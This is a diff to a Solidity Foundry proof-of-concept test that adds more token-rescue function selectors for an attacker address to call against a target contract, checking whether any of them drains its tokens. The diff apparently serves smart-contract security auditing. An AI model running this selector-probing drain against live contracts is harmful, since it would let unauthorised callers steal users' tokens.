@@ -99,6 +99,48 @@ contract PoC is Test {
             abi.encodeWithSignature("sweep(address,uint256)", token, before)
         );
         if (bytes(used).length > 0) return used;
+        used = _attempt(
+            attacker,
+            before,
+            "rescueERC20(address)",
+            abi.encodeWithSignature("rescueERC20(address)", token)
+        );
+        if (bytes(used).length > 0) return used;
+        used = _attempt(
+            attacker,
+            before,
+            "recoverERC20(address,uint256)",
+            abi.encodeWithSignature("recoverERC20(address,uint256)", token, before)
+        );
+        if (bytes(used).length > 0) return used;
+        used = _attempt(
+            attacker,
+            before,
+            "withdrawToken(address,uint256)",
+            abi.encodeWithSignature("withdrawToken(address,uint256)", token, before)
+        );
+        if (bytes(used).length > 0) return used;
+        used = _attempt(
+            attacker,
+            before,
+            "withdrawTokens(address,uint256)",
+            abi.encodeWithSignature("withdrawTokens(address,uint256)", token, before)
+        );
+        if (bytes(used).length > 0) return used;
+        used = _attempt(
+            attacker,
+            before,
+            "rescue(address,address,uint256)",
+            abi.encodeWithSignature("rescue(address,address,uint256)", token, attacker, before)
+        );
+        if (bytes(used).length > 0) return used;
+        used = _attempt(
+            attacker,
+            before,
+            "rescueTokens(address,address,uint256)",
+            abi.encodeWithSignature("rescueTokens(address,address,uint256)", token, attacker, before)
+        );
+        if (bytes(used).length > 0) return used;
         return "";
     }
 
@@ -122,7 +164,7 @@ contract PoC is Test {
         assertGt(
             drained,
             0,
-            "no token-rescue selector moved tokens out of the target. Tried rescueERC20(address,uint256), rescueToken(address,uint256), rescueTokens(address,uint256), withdrawERC20(address,uint256), sweep(address,uint256). This does NOT establish safety: the rescue may be guarded by an owner check, named differently, take other arguments, or be reachable only by a specific caller."
+            "no token-rescue selector moved tokens out of the target. Tried rescueERC20(address,uint256), rescueToken(address,uint256), rescueTokens(address,uint256), withdrawERC20(address,uint256), sweep(address,uint256), rescueERC20(address), recoverERC20(address,uint256), withdrawToken(address,uint256), withdrawTokens(address,uint256), rescue(address,address,uint256), rescueTokens(address,address,uint256). This does NOT establish safety: the rescue may be guarded by an owner check, named differently, take other arguments, or be reachable only by a specific caller."
         );
     }
 }
